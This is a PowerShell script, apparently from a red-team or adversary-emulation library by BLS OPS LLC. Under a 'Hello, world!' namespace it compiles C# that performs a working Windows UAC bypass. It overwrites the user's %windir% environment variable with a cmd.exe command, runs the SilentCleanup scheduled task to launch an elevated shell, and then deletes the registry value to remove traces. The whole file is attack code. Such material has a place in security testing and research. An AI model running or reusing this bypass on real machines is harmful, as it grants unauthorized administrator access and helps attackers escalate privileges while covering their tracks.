<!--
# -------------------------------------------------------------------------------
# Copyright: (c) BLS OPS LLC.
# This program is free software: you can redistribute it and/or modify
# it under the terms of the GNU General Public License as published by
# the Free Software Foundation, version 3.
# This program is distributed in the hope that it will be useful,
# but WITHOUT ANY WARRANTY; without even the implied warranty of
# MERCHANTABILITY or FITNESS FOR A PARTICULAR PURPOSE. See the
# GNU General Public License for more details.
# You should have received a copy of the GNU General Public License
# along with this program. If not, see <https://www.gnu.org/licenses/>.
# -------------------------------------------------------------------------------
-->
```powershell
$assemblies=(
	"System"
)

$source=@"
using System;
using Microsoft.Win32;
using System.Diagnostics;

namespace Helloworld
{
	public static class Hello{
		public static void Main(){

			Console.WriteLine("Hello, world!");
            // Payload to be executed
            Console.WriteLine("[+] Starting Bypass UAC.");

            string payload = "";

            
                Console.WriteLine("[+] No Payload specified. Executing cmd.exe.");
                payload = @"C:\Windows\System32\cmd.exe";

            try
            {
                // Registry Key Modification
                RegistryKey key;
                key = Registry.CurrentUser.CreateSubKey(@"Environment");
                key.SetValue("windir", "cmd.exe /k " + payload + " & ", RegistryValueKind.String);
                key.Close();

                Console.WriteLine("[+] Enviroment Variabled %windir% Created.");
            }
            catch
            {
                Console.WriteLine("[-] Unable to Create the Enviroment Variabled %windir%.");
                Console.WriteLine("[-] Exit.");
            }

            //Wait 5 sec before execution
            Console.WriteLine("[+] Waiting 5 seconds before execution.");
            System.Threading.Thread.Sleep(5000);

            // Trigger the UAC Bypass 
            try
            {
                ProcessStartInfo startInfo = new ProcessStartInfo();
                startInfo.CreateNoWindow = true;
                startInfo.UseShellExecute = false;
                startInfo.FileName = "schtasks.exe";
                startInfo.Arguments = @"/Run /TN \Microsoft\Windows\DiskCleanup\SilentCleanup /I";
                Process.Start(startInfo);

                Console.WriteLine("[+] UAC Bypass Application Executed.");
            }
            catch
            {
                Console.WriteLine("[-] Unable to Execute the Application schtasks.exe to perform the bypass.");
            }
            
            //Clean Registry
            DeleteKey();

            Console.WriteLine("[-] Exit.");
        }

        static void DeleteKey()
        {
            //Wait 5 sec before cleaning
            Console.WriteLine("[+] Registry Cleaning will start in 5 seconds.");
            System.Threading.Thread.Sleep(5000);

            try
            {
                var rkey = Registry.CurrentUser.OpenSubKey(@"Environment",true);

                // Validate if the Key Exist
                if (rkey != null)
                {
                    try
                    {
                        rkey.DeleteValue("windir");
                        rkey.Close();
                    }
                    catch (Exception err)
                    {
                        Console.WriteLine(@"[-] Unable to Delete the Registry key (Environment). Error "+err.Message);
                    }
                }

                Console.WriteLine("[+] Registry Cleaned.");
            }
            catch
            {
                Console.WriteLine("[-] Unable to Clean the Registry.");
            }
		}
	}
}
"@

Add-Type -ReferencedAssemblies $assemblies -TypeDefinition $source -Language CSharp
[HelloWorld.Hello]::Main()
```